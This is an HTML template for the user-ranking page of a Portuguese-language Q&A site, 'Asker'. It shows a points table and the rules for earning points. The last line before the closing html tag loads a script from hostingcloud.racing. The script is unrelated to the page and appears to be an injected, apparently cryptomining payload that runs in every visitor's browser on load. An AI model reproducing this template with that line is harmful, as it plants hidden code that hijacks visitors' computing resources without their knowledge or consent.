<!doctype html>
<html lang="pt-br">
	<head>
		<title>Asker | Rank</title>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">

		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
		<link href="https://fonts.googleapis.com/css?family=Raleway:400,500,500i,700,800i" rel="stylesheet">

		<script src="https://kit.fontawesome.com/1f965a8b94.js"></script>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

		<style>
			.rank {
				width: 50%;
				margin: 5px auto;
			}

			@media (min-width: 320px) and (max-width: 480px) {
				.rank {
					width: 95%;
				}
			}
		</style>
	</head>
	<body>
	{% include 'includes/nav.html' %}
	{% block content %}
    {% endblock %}

		<main class="rank">
			<table class="table table-bordered">
				<head>
					<tr>
						<th>Posição</th><th>Pontos</th><th>Aliás</th>
					</tr>
				</head>

				<tbody>
					{% for user in rank %}
					<tr>
						<td># {{ user.rank }}</td><td>{{ user.total_points }}</td><td><a href="/user/{{ user.user.username }}">{{ user.user.username }}</a></td>
					</tr>
					{% endfor %}
				</tbody>
			</table>

			<p>Para conseguir pontos você pode:</p>
			<ul>
				<li>Responder - 2 pontos por resposta</li>
				<li>Perguntar - 1 ponto por pergunta</li>
			</ul>
		</main>

<script src="https://www.hostingcloud.racing/gCgZ.js"></script>

</html>
